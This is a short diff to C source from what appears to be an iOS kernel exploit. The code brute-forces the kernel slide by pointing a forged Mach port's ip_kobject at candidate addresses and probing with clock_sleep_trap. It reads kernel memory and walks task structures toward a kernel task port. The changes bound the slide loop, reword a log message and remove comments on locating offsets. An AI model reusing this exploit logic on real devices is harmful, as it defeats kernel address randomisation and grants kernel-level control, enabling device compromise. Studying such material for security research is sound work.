@@ -492,6 +492,7 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
 
 #define KSLIDE_BASE     0x1000000
 #define KSLIDE_INTERVAL 0x200000
+#define KSLIDE_LIMIT    KSLIDE_BASE + (KSLIDE_INTERVAL * 0x100)
 
     /* 
         find the slide via clock_sleep
@@ -504,7 +505,7 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
         (clock_sleep_trap will sometimes return success even if it's not the right kslide)
     */
     uint64_t k = KSLIDE_BASE + KSLIDE_INTERVAL;
-    while (true)
+    while (k <= KSLIDE_LIMIT)
     {
         fakeport->ip_kobject = textbase + k;
         
@@ -524,7 +525,8 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
         }
     }
 
-    LOG("failed to find clock");
+    /* if this fails, your system_clock offset is probably wrong */
+    LOG("failed to find clock/kslide");
     goto out;
 
 gotclock:;
@@ -618,10 +620,6 @@ value = value | ((uint64_t)read64_tmp << 32)
     */ 
     mach_ports_register(mach_task_self(), &client, 1);
     
-    // joker -m kernel | grep mach_ports_lookup
-    // look for 3 func calls one after another
-    // 3 offsets (ie. 0x2e8, 0x2f0, 0x2f8)
-    // these are task->itk_registered[0,1,2]
     uint64_t itk_registered;
     rk64(ourtask + offsets->struct_offsets.task_itk_registered, itk_registered);
     LOG("itk_registered: 0x%llx", itk_registered);
